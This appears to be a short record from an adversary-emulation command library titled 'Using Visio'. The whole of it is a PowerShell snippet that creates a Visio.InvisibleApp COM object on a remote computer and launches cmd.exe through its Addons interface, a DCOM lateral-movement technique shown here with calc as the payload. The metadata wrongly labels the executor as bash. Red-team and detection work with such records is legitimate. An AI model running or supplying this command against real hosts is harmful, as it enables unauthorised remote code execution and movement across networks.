---
id: 15a03bd9-93d4-4d95-bde5-ee220e1d7ee4
name: Using Visio
type: command
executor: bash
data: '$visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Visio.InvisibleApp\",
  \"$ComputerName\"))

  $visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")'
output: null
created_at: '2023-04-06T03:56:07.120726+00:00'
updated_at: '2023-04-10T20:26:32.005120+00:00'
---

# Using Visio

```bash
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Visio.InvisibleApp\", \"$ComputerName\"))
$visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")
```


